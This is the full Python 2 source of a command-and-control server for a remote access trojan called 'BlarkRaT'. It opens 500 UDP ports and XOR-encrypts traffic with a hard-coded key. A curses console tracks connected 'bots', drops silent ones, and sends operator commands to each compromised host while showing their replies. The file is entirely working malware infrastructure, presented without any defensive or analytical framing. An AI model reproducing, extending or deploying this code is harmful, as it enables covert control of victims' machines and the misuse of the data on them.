#!/usr/bin/python
import curses, curses.panel, random, select, socket, ssl, sys, string, threading, time
from Queue import Queue
from itertools import cycle, izip

q = Queue()
logs = {'MAIN':{'log':[]}}

key = "blarknob"

printable = string.ascii_letters + string.digits + string.punctuation + ' '

def crypt(m):
    return ''.join(chr(ord(c)^ord(k)) for c, k in izip(m, cycle(key)))

class listener(threading.Thread):
    def __init__(self, ip, ports):
        threading.Thread.__init__(self)
        self.running = True
        self.finished = False
        self.host = ''
        self.socks = []
        self.context = None
        self.ip = ip
        self.ports = ports
        self.oq = Queue()

    def openSocket(self):
        for p in self.ports:
            if not self.running:
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setblocking(0)
                s.bind((self.ip, p))
                self.socks.append(s)
            except:
                q.put('[*] Unable to open socket on: ' + i + ':443\n')
        q.put('[*] Sockets opened.\n')
        return True

    def run(self):
        self.openSocket()
        while self.running:
            while not self.oq.empty():
                msg = self.oq.get()
                logs[msg[0]]['log'].append(msg[1] + '\n')
                logs[msg[0]]['sock'].sendto(crypt(msg[1]), logs[msg[0]]['addr'])
            ins = select.select(self.socks,[],[],0)[0]
            for s in ins:
                try:
                    data, addr = s.recvfrom(65535)
                    data = crypt(data).replace('<<CRLCHK>>','')

                    if not addr[0] in logs.keys():
                        q.put('[*] Connection from: ' + str(addr) + ' ' + time.ctime() + '\n')
                        logs[addr[0]] = {'sock': s, 'addr': addr, 'lastseen': time.time(), 'log': [], 'cmdhist': [''], 'prompt': '>'}
                        logs[addr[0]]['port'] = s.getsockname()[1];
                    else:
                        logs[addr[0]]['sock'] = s
                        logs[addr[0]]['addr'] = addr
                        logs[addr[0]]['lastseen'] = time.time()
                        logs[addr[0]]['port'] = s.getsockname()[1];
                        logs[addr[0]]['log'].append(data)

                except:
                    q.put('[*] Connection error.\n')
                    continue
            time.sleep(0.1)

class guiThread(threading.Thread):

    def __init__(self, opts, l):
        threading.Thread.__init__(self)
        self.running = True
        self.l = l

        self.screen = None
        self.cmdhist = ['']
        self.tabfocus = 'MAIN'
        self.cmdhistpos = 0
        self.loghistpos = 0
        self.lastax = 0
        self.lastay = 0
        self.win1 = None
        self.win2 = None
        self.win3 = None
        self.win4 = None
        self.win5 = None

        self.screen = curses.initscr()
        curses.noecho()
        curses.start_color()
        curses.cbreak()
        self.screen.keypad(1)
        self.screen.nodelay(1)
        logs['MAIN']['log'].append('[#] Starting the herder...\n')

    def run(self):
        while self.running:
            try:
                if not self.tabfocus in logs.keys():
                    self.tabfocus = 'MAIN'
                while not q.empty():
                    msg = q.get()
                    logs['MAIN']['log'].append(msg)

                for b in logs.keys():
                    if b != 'MAIN' and logs[b]['lastseen'] < time.time() - 60:
                        if self.tabfocus == b:
                            self.tabfocus = 'MAIN'
                        logs['MAIN']['log'].append('[!] Bot: ' + b + ' has died.  Removing.\n')
                        del logs[b]
                
                self.displayScreen()
                if select.select([sys.stdin,],[],[],0)[0]:
                    self.win4.keypad(1)
                    c = self.win4.getch()
                    #curses.endwin(); print "KEY NAME:", c
                    if c == 9:
                        self.cmdhistpos = 0
                        self.loghistpos = 0
                        tf = logs.keys().index(self.tabfocus) + 1
                        if tf >= len(logs.keys()):
                            tf = 0
                        self.tabfocus = logs.keys()[tf]
                    elif c == 10:
                        clear = True
                        self.loghistpos = 0
                        if self.tabfocus == 'MAIN':
                            if self.cmdhist[self.cmdhistpos][:4] == 'exit' or self.cmdhist[self.cmdhistpos][:4] == 'quit':
                                logs['MAIN']['log'].append('Quitting, please wait...\n')
                                self.running = False
                                sys.exit(0)
                            else:
                                logs['MAIN']['log'].append(self.cmdhist[self.cmdhistpos] + '\n')
                                if (self.cmdhistpos == 0):
                                    self.cmdhist.insert(0, '')
                                else:
                                    self.cmdhist.insert(1, self.cmdhist.pop(self.cmdhistpos))
                                    self.cmdhist[0] = ''
                        else:
                            self.l.oq.put((self.tabfocus, logs[self.tabfocus]['cmdhist'][self.cmdhistpos]))
                            if (clear):
                                if (self.cmdhistpos == 0):
                                    logs[self.tabfocus]['cmdhist'].insert(0, '')
                                else:   
                                    logs[self.tabfocus]['cmdhist'].insert(1, logs[self.tabfocus]['cmdhist'].pop(self.cmdhistpos))
                                    self.cmdhist[0] = ''
                        self.cmdhistpos = 0
                    elif c == curses.KEY_UP:
                        self.cmdhistpos = self.cmdhistpos + 1
                        if self.tabfocus == 'MAIN':
                            if (self.cmdhistpos > len(self.cmdhist)-1):
                                self.cmdhistpos = len(self.cmdhist)-1
                        else:
                            if (self.cmdhistpos > len(logs[self.tabfocus]['cmdhist'])-1):
                                self.cmdhistpos = len(logs[self.tabfocus]['cmdhist'])-1
                            
                    elif c == curses.KEY_DOWN:
                        self.cmdhistpos = self.cmdhistpos - 1
                        if (self.cmdhistpos < 0):
                            self.cmdhistpos = 0
                    elif c == 263 or c == 127:
                        if self.tabfocus == 'MAIN':
                            self.cmdhist[self.cmdhistpos] = self.cmdhist[self.cmdhistpos][:-1]
                        else:
                            logs[self.tabfocus]['cmdhist'][self.cmdhistpos] = logs[self.tabfocus]['cmdhist'][self.cmdhistpos][:-1]
                    elif c >= 32 and c <= 126:
                        if self.tabfocus == 'MAIN':
                            self.cmdhist[self.cmdhistpos] = self.cmdhist[self.cmdhistpos] + chr(c)
                        else:
                            logs[self.tabfocus]['cmdhist'][self.cmdhistpos] = logs[self.tabfocus]['cmdhist'][self.cmdhistpos] + chr(c)
                    elif c == 339 or c == 338 or c == 396 or c == 398:
                        if c == 339:
                            self.loghistpos += self.lastay
                        elif c == 338:
                            self.loghistpos -= self.lastay
                        elif c == 396:
                            self.loghistpos -= 1
                        elif c == 398:
                            self.loghistpos += 1
                        if self.tabfocus == 'MAIN':
                            if self.loghistpos > len(logs['MAIN']['log']):
                                self.loghistpos = len(logs['MAIN']['log'])
                        else:
                            if self.loghistpos > len(''.join(logs[self.tabfocus]['log']).split('\n')) - self.lastay:
                                self.loghistpos = len(''.join(logs[self.tabfocus]['log']).split('\n')) - self.lastay
                        if self.loghistpos < 0:
                            self.loghistpos = 0
                time.sleep(0.02)
            except select.error, e:
                sys.stderr.write(error + '\n')
        curses.endwin()
        self.running = False
        sys.exit(0)


    def displayScreen(self):
        ay,ax = self.screen.getmaxyx()
        resized = False
        if self.lastax != ax:
            self.lastax = ax
            resized = True
        if self.lastay != ay:
            self.lastay = ay
            resized = True
        if resized:
            curses.resizeterm(ay,ax)
        self.win1 = curses.newwin(3,0,0,0)
        self.win2 = curses.newwin(3,0,3,0)
        if ay > 0:
            self.win3 = curses.newpad(ay,ax)
        else:
            self.win3 = curses.newpad(1,ax)
        self.win4 = curses.newwin(3,ax-28,ay-3,0)
        self.win5 = curses.newwin(3,0,ay-3,ax-28)
        self.win1.box()
        self.win2.box()
        self.win4.box()
        self.win5.box()
        panel1 = curses.panel.new_panel(self.win1)
        panel2 = curses.panel.new_panel(self.win2)
        panel5 = curses.panel.new_panel(self.win5)
        panel4 = curses.panel.new_panel(self.win4)
        self.win1.addstr(1,1,'BlarkRaT ' + str(ax) + 'x' + str(ay) + ' Current threads: ' + '0')
        tabtext = ''
        for i in logs.keys():
            focused = (i == self.tabfocus)
            if '.' in i:
                i = '.'.join(i.split('.')[2:])
            if focused:
                tabtext = tabtext + '>' + i + '< '
            else:   
                tabtext = tabtext + ' ' + i + '  '
        self.win2.addstr(1, 1, tabtext)
        row = 0
        if self.tabfocus == 'MAIN': #main tab
            t_log = ''.join(logs['MAIN']['log']).splitlines(True)
            f_log = []
            for line in t_log:
                f_log += [line[i:i+ax-1] for i in range(0, len(line), ax-1)]
            if len(f_log) > 0 and ay-9 > 0:
                self.win3.addstr(0,0,''.join(f_log[-(ay-9):]))
        else: #thread tabs
            t_log = ''.join(logs[self.tabfocus]['log']).replace('\r\n','\n').splitlines(True)
            t_log = t_log[:len(t_log)-self.loghistpos]
            f_log = []
            self.win5.addstr(1,1, str(logs[self.tabfocus]['port']) + ' // ' + time.strftime('%d-%m-%y %H:%M:%S', time.localtime(logs[self.tabfocus]['lastseen'])))
            for line in t_log:
                f_log += [line[i:i+ax] for i in range(0, len(line), ax)]
            if len(f_log) > 0 and ay-11 > 0:
                self.win3.addstr(0,0,''.join(f_log[-(ay-9):]))
        
        if self.tabfocus == 'MAIN':
            self.win4.addstr(1,1,'>' + self.cmdhist[self.cmdhistpos])
        else:
#            try:
#                if self.l.threads[self.tabfocus].isAlive():
            self.win4.addstr(1,1,logs[self.tabfocus]['prompt'] + logs[self.tabfocus]['cmdhist'][self.cmdhistpos])
#            except:
#                self.tabfocus = 0
#                self.win4.addstr(1,1,'>' + self.cmdhist[self.cmdhistpos])
        if ax-1 > 0 and ay-9 > 0:
            self.win3.refresh(0,0,6,0,ay-4,ax-1)
        curses.panel.update_panels()
        curses.doupdate()

    def restoreScreen(self):
        curses.initscr()
        curses.nocbreak()
        curses.echo()
        curses.endwin()

    def __del__(self):
        self.restoreScreen()

def main():
    if len(sys.argv) < 2 or len(sys.argv) > 2:
        print 'Usage ./c2.py <listen ip>'
        sys.exit(1)
        return
    else:
        ip = sys.argv[1]
    running = True
    threads = []
    ports = []
    ports = range(58800,58800+500)
    l = listener(ip, ports)
    threads.append(l)
    t = guiThread([], l)
    threads.append(t)
    if running:
        for i in threads:
            i.start()
        try:
            while len(threads) > 0 and running:
                threads = [t for t in threads if t.isAlive()]
                time.sleep(0.5)

        except KeyboardInterrupt:
            running = False

        NETWORK_TIMEOUT = 5000
        sys.stderr.write('[!] Shutting down...\n')

    for t in threads: 
        t.running = False
        if t.isAlive():
            t.join()

    sys.stderr.write('[!] Quit.\n')
    sys.exit()

if __name__ == '__main__':
    main()

